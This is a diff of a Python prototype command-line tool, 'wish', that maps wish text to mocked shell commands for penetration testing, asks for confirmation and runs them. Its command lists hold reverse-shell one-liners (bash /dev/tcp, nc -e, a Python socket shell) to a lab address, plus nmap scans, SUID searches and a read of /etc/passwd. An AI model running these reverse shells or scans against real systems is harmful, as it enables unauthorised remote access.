@@ -1,307 +1,476 @@
 #!/usr/bin/env python3
-import json
 import os
-import random
-import subprocess
 import sys
+import random
+import json
+import datetime
+import subprocess
+import signal
+import time
 import uuid
-from datetime import datetime
+from pathlib import Path
+from enum import Enum
+from typing import List, Dict, Optional, Any, Tuple
 
-from wish_models import CommandResult, Wish, WishState
-
-# --------------------
-# 事前設定・モデル部分
-# --------------------
-
-WISH_HOME = os.path.expanduser("~/.wish")
-if not os.path.exists(WISH_HOME):
-    os.makedirs(WISH_HOME)
-HISTORY_FILE = os.path.join(WISH_HOME, "history.jsonl")
+# Constants
+DEFAULT_WISH_HOME = os.path.join(os.path.expanduser("~"), ".wish")
 
 
-def load_history():
-    wishes = []
-    if os.path.exists(HISTORY_FILE):
-        with open(HISTORY_FILE, "r", encoding="utf-8") as f:
-            for line in f:
-                line = line.strip()
-                if line:
-                    data = json.loads(line)
-                    wishes.append(Wish.from_dict(data))
-    return wishes
+# Enums
+class WishState(str, Enum):
+    CREATED = "created"
+    DOING = "doing"
+    DONE = "done"
+    CANCELLED = "cancelled"
 
 
-def save_to_history(wish_obj):
-    with open(HISTORY_FILE, "a", encoding="utf-8") as f:
-        f.write(json.dumps(wish_obj.to_dict(), ensure_ascii=False) + "\n")
+class ExitClassEnum(str, Enum):
+    SUCCESS = "success"
+    ERROR = "error"
+    TIMEOUT = "timeout"
+    USER_CANCEL = "user_cancel"
 
 
-def overwrite_history(wishes):
-    with open(HISTORY_FILE, "w", encoding="utf-8") as f:
-        for w in wishes:
-            f.write(json.dumps(w.to_dict(), ensure_ascii=False) + "\n")
+# Models (simplified for prototype)
+class LogFiles:
+    def __init__(self, stdout_path: Path, stderr_path: Path):
+        self.stdout = stdout_path
+        self.stderr = stderr_path
 
 
-def generate_dummy_commands(wish_text):
-    """
-    wish_text に応じたコマンド候補をランダムに生成（LLM未実装のダミー）
-    """
-    dummy_pool = [
-        "ls -la",
-        "pwd",
-        "cat /etc/passwd",
-        "echo 'Hello World!'",
-        "find / -perm -u=s -type f 2>/dev/null",
-        "sudo nmap -p- 127.0.0.1",
-        "nc -nv 10.0.0.1 4444 -e /bin/bash",
-    ]
-    num_commands = random.randint(1, 3)
-    return random.sample(dummy_pool, num_commands)
+class CommandResult:
+    def __init__(self, command: str):
+        self.command = command
+        self.timeout_sec = None
+        self.exit_code = None
+        self.exit_class = None
+        self.log_summary = None
+        self.log_files = None
+        self.created_at = datetime.datetime.utcnow().isoformat()
+        self.finished_at = None
+        self.process = None
+
+    def to_dict(self):
+        return {
+            "command": self.command,
+            "timeout_sec": self.timeout_sec,
+            "exit_code": self.exit_code,
+            "exit_class": self.exit_class,
+            "log_summary": self.log_summary,
+            "log_files": {
+                "stdout": str(self.log_files.stdout) if self.log_files else None,
+                "stderr": str(self.log_files.stderr) if self.log_files else None,
+            },
+            "created_at": self.created_at,
+            "finished_at": self.finished_at,
+        }
 
 
-def run_command(cmd, wish_id, cmd_index):
-    log_dir = os.path.join(WISH_HOME, wish_id, "log")
-    os.makedirs(log_dir, exist_ok=True)
+class Wish:
+    def __init__(self, wish_text: str):
+        self.id = uuid.uuid4().hex[:10]
+        self.wish = wish_text
+        self.state = WishState.CREATED
+        self.command_results = []
+        self.created_at = datetime.datetime.utcnow().isoformat()
+        self.finished_at = None
 
-    stdout_file = os.path.join(log_dir, f"{cmd_index}.stdout")
-    stderr_file = os.path.join(log_dir, f"{cmd_index}.stderr")
-
-    with open(stdout_file, "wb") as out, open(stderr_file, "wb") as err:
-        proc = subprocess.Popen(cmd, shell=True, stdout=out, stderr=err)
-        proc.wait()
-
-    return proc.returncode, stdout_file, stderr_file
-
-
-def print_commands(commands):
-    print("このコマンドをすべて実行しますか？ [Y/n]")
-    for i, cmd in enumerate(commands, 1):
-        print(f"[{i}] {cmd}")
-
-
-def show_wish_detail(wish_obj):
-    if not wish_obj.command_results:
-        print("このwishにはコマンドがありません。")
-        return
-
-    print(f"\nどのコマンドの経過・結果を確認しますか？ (1～{len(wish_obj.command_results)})")
-    for i, cr in enumerate(wish_obj.command_results, 1):
-        status = "done" if cr.exit_code is not None else "doing"
-        print(f"[{i}] cmd: {cr.command} ({status})")
-
-    ans = input("\nwish❓ ").strip()
-    if ans.isdigit():
-        cmd_idx = int(ans)
-        if 1 <= cmd_idx <= len(wish_obj.command_results):
-            cr = wish_obj.command_results[cmd_idx - 1]
-            if cr.exit_code is None:
-                print("まだ実行中、または実行されていません。")
-            else:
-                print("\n--- stdout (先頭10行) ---")
-                if cr.stdout_file and os.path.exists(cr.stdout_file):
-                    with open(cr.stdout_file, "r", encoding="utf-8", errors="ignore") as f:
-                        for line in f.readlines()[:10]:
-                            print(line, end="")
-                print("\n--- stderr (先頭10行) ---")
-                if cr.stderr_file and os.path.exists(cr.stderr_file):
-                    with open(cr.stderr_file, "r", encoding="utf-8", errors="ignore") as f:
-                        for line in f.readlines()[:10]:
-                            print(line, end="")
+    def to_dict(self):
+        return {
+            "id": self.id,
+            "wish": self.wish,
+            "state": self.state,
+            "command_results": [cmd.to_dict() for cmd in self.command_results],
+            "created_at": self.created_at,
+            "finished_at": self.finished_at,
+        }
 
 
-def show_wishlist(wishes):
-    if not wishes:
-        print("まだwishがありません。")
-        return None
-
-    print()
-    for i, w in enumerate(wishes, 1):
-        state_str = w.state
-        print(f"[{i}] wish: {w.wish_text} (created: {w.created_at}; state: {state_str})")
-
-    ans = input("\nwish❓ ").strip()
-    if ans.isdigit():
-        idx = int(ans)
-        if 1 <= idx <= len(wishes):
-            show_wish_detail(wishes[idx - 1])
-    return None
-
-
-# --------------------
-# ステートマシン部 (Shell Turns)
-# --------------------
-
-
-class State:
-    IDLE = "idle"
-    NEW_WISH = "new_wish"
-    EXECUTE_CONFIRMATION = "execute_confirmation"
-    SPECIFY_MODIFY = "specify_modify"
-    EXECUTE = "execute"
-    SHOW_WISHLIST = "show_wishlist"
-    EXIT = "exit"
-
-
-class ShellTurns:
+# Settings
+class Settings:
     def __init__(self):
-        self.state = State.IDLE
-        self.wishes = load_history()
+        self.WISH_HOME = os.environ.get("WISH_HOME", DEFAULT_WISH_HOME)
+
+
+class WishPaths:
+    def __init__(self, settings: Settings):
+        self.settings = settings
+        self.history_path = Path(settings.WISH_HOME) / "history.jsonl"
+
+    def ensure_directories(self):
+        """Ensure all required directories exist."""
+        wish_home = Path(self.settings.WISH_HOME)
+        wish_home.mkdir(parents=True, exist_ok=True)
+
+        # Ensure history file exists
+        if not self.history_path.exists():
+            with open(self.history_path, "w") as f:
+                pass
+
+    def get_wish_dir(self, wish_id: str) -> Path:
+        """Get the directory for a specific wish."""
+        return Path(self.settings.WISH_HOME) / "w" / wish_id
+
+    def create_command_log_dirs(self, wish_id: str) -> Path:
+        """Create log directories for commands of a wish."""
+        cmd_log_dir = self.get_wish_dir(wish_id) / "c" / "log"
+        cmd_log_dir.mkdir(parents=True, exist_ok=True)
+        return cmd_log_dir
+
+
+# Core functionality
+class WishManager:
+    def __init__(self, settings: Settings):
+        self.settings = settings
+        self.paths = WishPaths(settings)
+        self.paths.ensure_directories()
         self.current_wish = None
-        self.generated_commands = None
-        self.execute_indices = None  # 実行対象のコマンド番号（集合）
+        self.running_commands = {}
+
+    def save_wish(self, wish: Wish):
+        """Save wish to history file."""
+        with open(self.paths.history_path, "a") as f:
+            f.write(json.dumps(wish.to_dict()) + "\n")
+
+    def load_wishes(self, limit: int = 10) -> List[Wish]:
+        """Load recent wishes from history file."""
+        wishes = []
+        try:
+            with open(self.paths.history_path, "r") as f:
+                lines = f.readlines()
+                for line in reversed(lines[-limit:]):
+                    wish_dict = json.loads(line.strip())
+                    wish = Wish(wish_dict["wish"])
+                    wish.id = wish_dict["id"]
+                    wish.state = wish_dict["state"]
+                    wish.created_at = wish_dict["created_at"]
+                    wish.finished_at = wish_dict["finished_at"]
+                    # (simplified: not loading command results for prototype)
+                    wishes.append(wish)
+        except (FileNotFoundError, json.JSONDecodeError):
+            pass
+        return wishes
+
+    def generate_commands(self, wish_text: str) -> List[str]:
+        """Generate commands based on wish text (mock implementation)."""
+        # In a real implementation, this would call an LLM
+        # For prototype, return some predefined responses based on keywords
+        commands = []
+        wish_lower = wish_text.lower()
+
+        if "scan" in wish_lower and "port" in wish_lower:
+            commands = [
+                "sudo nmap -p- -oA tcp 10.10.10.40",
+                "sudo nmap -n -v -sU -F -T4 --reason --open -T4 -oA udp-fast 10.10.10.40",
+            ]
+        elif "find" in wish_lower and "suid" in wish_lower:
+            commands = ["find / -perm -u=s -type f 2>/dev/null"]
+        elif "reverse shell" in wish_lower or "revshell" in wish_lower:
+            commands = [
+                "bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'",
+                "nc -e /bin/bash 10.10.14.10 4444",
+                'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);\'',
+            ]
+        else:
+            # Default responses
+            commands = [f"echo 'Executing wish: {wish_text}'", f"echo 'Processing {wish_text}' && ls -la"]
+
+        return commands
+
+    def execute_command(self, wish: Wish, command: str, index: int) -> CommandResult:
+        """Execute a command and capture its output."""
+        result = CommandResult(command)
+        wish.command_results.append(result)
+
+        # Create log directories and files
+        log_dir = self.paths.create_command_log_dirs(wish.id)
+        stdout_path = log_dir / f"{index}.stdout"
+        stderr_path = log_dir / f"{index}.stderr"
+        result.log_files = LogFiles(stdout_path, stderr_path)
+
+        with open(stdout_path, "w") as stdout_file, open(stderr_path, "w") as stderr_file:
+            try:
+                # Start the process
+                process = subprocess.Popen(command, stdout=stdout_file, stderr=stderr_file, shell=True, text=True)
+                result.process = process
+
+                # Store in running commands dict
+                self.running_commands[index] = (process, result)
+
+                # Wait for process completion (non-blocking return for UI)
+                return result
+
+            except Exception as e:
+                stderr_file.write(f"Failed to execute command: {str(e)}")
+                result.exit_code = 1
+                result.exit_class = ExitClassEnum.ERROR
+                result.finished_at = datetime.datetime.utcnow().isoformat()
+                return result
+
+    def summarize_log(self, stdout_path: Path, stderr_path: Path) -> str:
+        """Generate a simple summary of command logs."""
+        summary = []
+
+        # Read stdout
+        try:
+            with open(stdout_path, "r") as f:
+                stdout_content = f.read().strip()
+                if stdout_content:
+                    lines = stdout_content.split("\n")
+                    if len(lines) > 10:
+                        summary.append(f"Standard output: {len(lines)} lines")
+                        summary.append("First few lines:")
+                        summary.extend(lines[:3])
+                        summary.append("...")
+                        summary.extend(lines[-3:])
+                    else:
+                        summary.append("Standard output:")
+                        summary.extend(lines)
+                else:
+                    summary.append("Standard output: <empty>")
+        except FileNotFoundError:
+            summary.append("Standard output: <file not found>")
+
+        # Read stderr
+        try:
+            with open(stderr_path, "r") as f:
+                stderr_content = f.read().strip()
+                if stderr_content:
+                    lines = stderr_content.split("\n")
+                    if len(lines) > 5:
+                        summary.append(f"Standard error: {len(lines)} lines")
+                        summary.append("First few lines:")
+                        summary.extend(lines[:3])
+                        summary.append("...")
+                    else:
+                        summary.append("Standard error:")
+                        summary.extend(lines)
+
+        except FileNotFoundError:
+            pass  # Don't mention if stderr is empty or missing
+
+        return "\n".join(summary)
+
+    def check_running_commands(self):
+        """Check status of running commands and update their status."""
+        for idx, (process, result) in list(self.running_commands.items()):
+            if process.poll() is not None:  # Process has finished
+                result.exit_code = process.returncode
+                result.exit_class = ExitClassEnum.SUCCESS if result.exit_code == 0 else ExitClassEnum.ERROR
+                result.finished_at = datetime.datetime.utcnow().isoformat()
+
+                # Generate log summary
+                if result.log_files:
+                    result.log_summary = self.summarize_log(result.log_files.stdout, result.log_files.stderr)
+
+                # Remove from running commands
+                del self.running_commands[idx]
+
+    def cancel_command(self, wish: Wish, cmd_index: int):
+        """Cancel a running command."""
+        if cmd_index in self.running_commands:
+            process, result = self.running_commands[cmd_index]
+
+            # Try to terminate the process
+            try:
+                process.terminate()
+                time.sleep(0.5)
+                if process.poll() is None:  # Process still running
+                    process.kill()  # Force kill
+            except:
+                pass  # Ignore errors in termination
+
+            # Update result
+            result.exit_class = ExitClassEnum.USER_CANCEL
+            result.finished_at = datetime.datetime.utcnow().isoformat()
+            del self.running_commands[cmd_index]
+
+            return f"Command {cmd_index} cancelled."
+        else:
+            return f"Command {cmd_index} is not running."
+
+    def format_wish_list_item(self, wish: Wish, index: int) -> str:
+        """Format a wish for display in wishlist."""
+        created_time = datetime.datetime.fromisoformat(wish.created_at).strftime("%H:%M:%S")
+        if wish.state == WishState.DONE and wish.finished_at:
+            finished_time = datetime.datetime.fromisoformat(wish.finished_at).strftime("%H:%M:%S")
+            return f"[{index}] wish: {wish.wish[:30]}{'...' if len(wish.wish) > 30 else ''}  (started at {created_time} ; done at {finished_time})"
+        else:
+            return f"[{index}] wish: {wish.wish[:30]}{'...' if len(wish.wish) > 30 else ''}  (started at {created_time} ; {wish.state})"
+
+
+# UI
+class WishCLI:
+    def __init__(self):
+        self.settings = Settings()
+        self.manager = WishManager(self.settings)
+        self.running = True
+
+    def print_prompt(self):
+        """Print the wish prompt."""
+        print("\nwish✨ ", end="", flush=True)
+
+    def print_question(self):
+        """Print the question prompt."""
+        print("\nwish❓ ", end="", flush=True)
+
+    def handle_wishlist(self):
+        """Display the list of wishes."""
+        wishes = self.manager.load_wishes()
+        if not wishes:
+            print("No wishes found.")
+            return
+
+        print("")
+        for i, wish in enumerate(wishes, 1):
+            print(self.manager.format_wish_list_item(wish, i))
+
+        print("\nもっと見る場合はエンターキーを、コマンドの経過・結果を確認したい場合は番号を入力してください。")
+        self.print_question()
+        choice = input().strip()
+
+        if choice and choice.isdigit():
+            choice_idx = int(choice) - 1
+            if 0 <= choice_idx < len(wishes):
+                self.handle_wish_details(wishes[choice_idx])
+            else:
+                print("Invalid selection.")
+
+    def handle_wish_details(self, wish: Wish):
+        """Show details for a specific wish."""
+        # For prototype, just show a simulated view
+        print(f"\nWish: {wish.wish}")
+        print(f"Status: {wish.state}")
+        print(f"Created at: {wish.created_at}")
+        if wish.finished_at:
+            print(f"Finished at: {wish.finished_at}")
+
+        # In a real implementation, we'd load and display command results
+        # For prototype, show mock data
+        print("\nCommands:")
+        for i, cmd in enumerate(["find / -perm -u=s -type f 2>/dev/null"], 1):
+            print(f"[{i}] cmd: {cmd} ({wish.state})")
+
+        self.print_question()
+        choice = input().strip()
+
+        if choice and choice.isdigit():
+            print("\n(Simulating log output for prototype)")
+            if wish.state == WishState.DONE:
+                print("\nLog Summary:")
+                print("/usr/bin/sudo")
+                print("/usr/bin/passwd")
+                print("/usr/bin/chfn")
+                print("...")
+                print(f"\nDetails are available in log files under {self.manager.paths.get_wish_dir(wish.id)}/c/log/")
+            else:
+                print("\n(Simulating tail -f output)")
+                print("/usr/bin/sudo")
+                print("/usr/bin/passwd")
+                print("...")
+
+    def execute_wish(self, wish_text: str):
+        """Process a wish and execute resulting commands."""
+        if not wish_text:
+            return
+
+        # Create a new wish
+        wish = Wish(wish_text)
+        wish.state = WishState.DOING
+        self.manager.current_wish = wish
+
+        # Generate commands
+        commands = self.manager.generate_commands(wish_text)
+
+        # Handle user input for target IP if needed
+        if "scan" in wish_text.lower() and "port" in wish_text.lower():
+            print("\n**What's the target IP address or hostname?**")
+            self.print_question()
+            target = input().strip()
+            if target:
+                commands = [cmd.replace("10.10.10.40", target) for cmd in commands]
+
+        # Display commands and ask for confirmation
+        if len(commands) > 1:
+            print(f"\nこのコマンドをすべて実行しますか？ [Y/n]")
+            for i, cmd in enumerate(commands, 1):
+                print(f"[{i}] {cmd}")
+
+            self.print_question()
+            confirm = input().strip().lower()
+
+            if confirm == "n":
+                print("\nそのまま実行するコマンドを `1` 、 `1,2` または `1-3` の形式で指定してください。")
+                self.print_question()
+                selection = input().strip()
+
+                # Parse selection
+                selected_indices = []
+                try:
+                    if "," in selection:
+                        for part in selection.split(","):
+                            if part.strip().isdigit():
+                                selected_indices.append(int(part.strip()) - 1)
+                    elif "-" in selection:
+                        start, end = selection.split("-")
+                        selected_indices = list(range(int(start.strip()) - 1, int(end.strip())))
+                    elif selection.isdigit():
+                        selected_indices = [int(selection) - 1]
+                except:
+                    print("Invalid selection format.")
+                    return
+
+                # Filter commands based on selection
+                if selected_indices:
+                    commands = [commands[i] for i in selected_indices if 0 <= i < len(commands)]
+                else:
+                    print("No valid commands selected.")
+                    return
+        else:
+            # Single command
+            print(f"\nこのコマンドを実行しますか？ [Y/n]")
+            print(f"[1] {commands[0]}")
+
+            self.print_question()
+            confirm = input().strip().lower()
+
+            if confirm == "n":
+                return
+
+        # Execute commands
+        print("\nコマンドの実行を開始しました。経過は Ctrl-R または `wishlist` で確認できます。")
+        for i, cmd in enumerate(commands, 1):
+            result = self.manager.execute_command(wish, cmd, i)
+
+        # Save wish to history
+        self.manager.save_wish(wish)
 
     def run(self):
-        print("Welcome to wish (prototype with Shell Turns)")
-        while self.state != State.EXIT:
-            if self.state == State.IDLE:
-                self.state_idle()
-            elif self.state == State.NEW_WISH:
-                self.state_new_wish()
-            elif self.state == State.EXECUTE_CONFIRMATION:
-                self.state_execute_confirmation()
-            elif self.state == State.SPECIFY_MODIFY:
-                self.state_specify_modify()
-            elif self.state == State.EXECUTE:
-                self.state_execute()
-            elif self.state == State.SHOW_WISHLIST:
-                self.state_show_wishlist()
-        print("Bye.")
+        """Main loop of the CLI."""
+        print("Welcome to wish v0.0.0 - Your wish, our command")
 
-    def state_idle(self):
-        user_input = input("\n$ ").strip()
-        if user_input == "":
-            self.state = State.NEW_WISH
-        elif user_input.lower() == "exit":
-            self.state = State.EXIT
-        elif user_input.lower() == "wishlist":
-            self.state = State.SHOW_WISHLIST
-        else:
-            # ユーザ入力をそのままwishと解釈
-            self.current_wish = Wish.create(user_input)
-            self.generated_commands = generate_dummy_commands(user_input)
-            self.state = State.EXECUTE_CONFIRMATION
+        while self.running:
+            # Check running commands status
+            self.manager.check_running_commands()
 
-    def state_new_wish(self):
-        # 新規wish作成のためwishテキストを入力
-        wish_text = input("\nwish✨ ").strip()
-        if not wish_text:
-            # 空入力ならIDLEへ戻る
-            self.state = State.IDLE
-            return
-        self.current_wish = Wish(wish_text)
-        self.generated_commands = generate_dummy_commands(wish_text)
-        print_commands(self.generated_commands)
-        self.state = State.EXECUTE_CONFIRMATION
+            # Display prompt and get input
+            self.print_prompt()
+            try:
+                wish_text = input().strip()
+            except (KeyboardInterrupt, EOFError):
+                print("\nExiting wish. Goodbye!")
+                sys.exit(0)
 
-    def state_execute_confirmation(self):
-        ans = input("\nwish❓ ").strip().lower()
-        if ans == "y" or ans == "":
-            # 全て実行する場合
-            self.execute_indices = set(range(1, len(self.generated_commands) + 1))
-            self.state = State.EXECUTE
-        elif ans == "n":
-            # 部分実行 or 修正
-            self.state = State.SPECIFY_MODIFY
-        else:
-            # 想定外なら再度確認
-            print("入力が不正です。もう一度選択してください。")
-            self.state = State.EXECUTE_CONFIRMATION
-
-    def state_specify_modify(self):
-        print("そのまま実行するコマンドを `1` 、 `1,2` または `1-3` の形式で指定してください。")
-        selection = input("\nwish❓ ").strip()
-        if not selection:
-            self.state = State.IDLE
-            return
-
-        indices = set()
-        for part in selection.split(","):
-            if "-" in part:
-                try:
-                    start, end = part.split("-")
-                    for i in range(int(start), int(end) + 1):
-                        indices.add(i)
-                except ValueError:
-                    continue
+            # Process input
+            if wish_text.lower() == "exit" or wish_text.lower() == "quit":
+                print("Exiting wish. Goodbye!")
+                self.running = False
+            elif wish_text.lower() == "wishlist":
+                self.handle_wishlist()
             else:
-                try:
-                    i = int(part)
-                    indices.add(i)
-                except ValueError:
-                    continue
-
-        if not indices:
-            print("実行対象が指定されませんでした。")
-            self.state = State.IDLE
-            return
-
-        self.execute_indices = indices
-        print(
-            f"\n[{', '.join(map(str, self.execute_indices))}] のみを実行しますか？ [Y] 修正したいコマンドがあればその番号を入力してください。"
-        )
-        ans = input("\nwish❓ ").strip().lower()
-        if ans.isdigit():
-            cmd_idx = int(ans)
-            if cmd_idx in self.execute_indices:
-                print("\n修正内容を指示してください。")
-                mod_text = input("wish❓ ").strip()
-                # 単純に"-T4"を除去し、末尾にコメントを付加する例
-                old_cmd = self.generated_commands[cmd_idx - 1]
-                new_cmd = old_cmd.replace("-T4", "")
-                if new_cmd == old_cmd:
-                    new_cmd += " # " + mod_text
-                self.generated_commands[cmd_idx - 1] = new_cmd
-                print(f"修正後のコマンド: {new_cmd}")
-        # 再確認
-        print("\nこのコマンドをすべて実行しますか？ [Y/n]")
-        for i, cmd in enumerate(self.generated_commands, 1):
-            if i in self.execute_indices:
-                print(f"[{i}] {cmd}")
-        ans = input("\nwish❓ ").strip().lower()
-        if ans == "n":
-            print("実行をキャンセルしました。")
-            self.state = State.IDLE
-        else:
-            self.state = State.EXECUTE
-
-    def state_execute(self):
-        # 指定されたコマンドを実行
-        for idx in sorted(self.execute_indices):
-            cmd = self.generated_commands[idx - 1]
-            cmd_res = CommandResult(cmd)
-            self.current_wish.command_results.append(cmd_res)
-            print(f"\nコマンドを実行します: {cmd}")
-            rc, out_f, err_f = run_command(cmd, self.current_wish.id, idx)
-            cmd_res.exit_code = rc
-            cmd_res.stdout_file = out_f
-            cmd_res.stderr_file = err_f
-            cmd_res.finished_at = datetime.utcnow().isoformat()
-
-        self.current_wish.state = WishState.DONE
-        self.current_wish.finished_at = datetime.utcnow().isoformat()
-        self.wishes.append(self.current_wish)
-        save_to_history(self.current_wish)
-        print("wishの実行が完了しました。")
-        self.state = State.IDLE
-
-    def state_show_wishlist(self):
-        show_wishlist(self.wishes)
-        overwrite_history(self.wishes)
-        self.state = State.IDLE
-
-
-# --------------------
-# エントリーポイント
-# --------------------
-
-
-def main():
-    shell = ShellTurns()
-    try:
-        shell.run()
-    except (KeyboardInterrupt, EOFError):
-        print("\nBye.")
+                self.execute_wish(wish_text)
 
 
 if __name__ == "__main__":
-    main()
+    cli = WishCLI()
+    cli.run()
